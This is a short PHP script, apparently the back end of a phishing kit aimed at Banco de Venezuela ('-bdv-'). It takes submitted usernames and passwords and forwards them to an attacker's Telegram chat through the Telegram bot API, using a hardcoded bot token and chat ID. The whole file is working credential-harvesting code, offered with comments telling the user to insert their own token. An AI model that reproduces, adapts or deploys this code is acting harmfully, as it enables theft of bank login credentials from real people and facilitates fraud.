<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $token = "7576739067:AAGirZWLYlIJ-B-krOiD7seIkcANYen-9JI"; // Reemplaza esto con tu nuevo bot token
    $chatId = "7938474239"; // Reemplaza esto con tu nuevo chat ID
    $usr = isset($_POST["usr"]) ? $_POST["usr"] : "Usuario no proporcionado";
    $pw = isset($_POST["pw"]) ? $_POST["pw"] : "Contraseña no proporcionada";
    $message = "-bdv-\n -Usuario: {$usr}  \nPw: {$pw}";
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array("chat_id" => $chatId, "text" => $message, "parse_mode" => "HTML");
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $response = curl_exec($ch);
    curl_close($ch);
    echo json_encode(array("status" => "success", "response" => $response));
} else {
    echo json_encode(array("status" => "error", "message" => "Método no permitido."));
}
?>